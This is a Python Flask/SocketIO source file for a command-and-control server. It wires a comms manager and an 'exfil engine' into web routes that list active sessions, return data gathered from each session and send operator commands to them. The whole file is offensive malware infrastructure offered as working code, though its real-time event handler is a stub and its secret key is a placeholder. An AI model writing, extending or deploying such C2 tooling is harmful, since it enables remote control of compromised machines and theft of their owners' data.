from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
from c2.comms_manager import CommsManager
from core.session_manager import SessionManager
from core.database_manager import DatabaseManager
from core.config_manager import ConfigManager
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'SECRET_KEY_HERE'
socketio = SocketIO(app)

class C2Server:
    def __init__(self, config_manager: ConfigManager, session_manager: SessionManager, exfil_engine):
        self.config = config_manager
        self.session_manager = session_manager
        self.exfil_engine = exfil_engine
        self.comms_manager = CommsManager(config_manager, session_manager, exfil_engine)
        self.running = False
        
        # Register routes
        app.route('/')(self.index)
        app.route('/api/command', methods=['POST'])(self.receive_command)
        app.route('/api/sessions')(self.list_sessions)
        app.route('/api/data/<session_id>')(self.get_session_data)
        
        # SocketIO events
        socketio.on('client_event')(self.handle_client_event)

    def index(self):
        return render_template('dashboard.html')

    def list_sessions(self):
        sessions = self.session_manager.get_active_sessions()
        return jsonify(sessions)

    def get_session_data(self, session_id):
        data = self.session_manager.get_session(session_id)
        return jsonify(data)

    def receive_command(self):
        data = request.json
        self.comms_manager.dispatch_command(data['session_id'], data['command'])
        return jsonify({'status': 'ok'})

    def handle_client_event(self):
        # Real-time stream handling
        pass

    def start(self):
        self.running = True
        # Run Flask in a thread
        t = threading.Thread(target=lambda: socketio.run(app, host=self.config.get('c2.host'), port=self.config.get('c2.port')))
        t.start()

    def stop(self):
        self.running = False
        socketio.stop()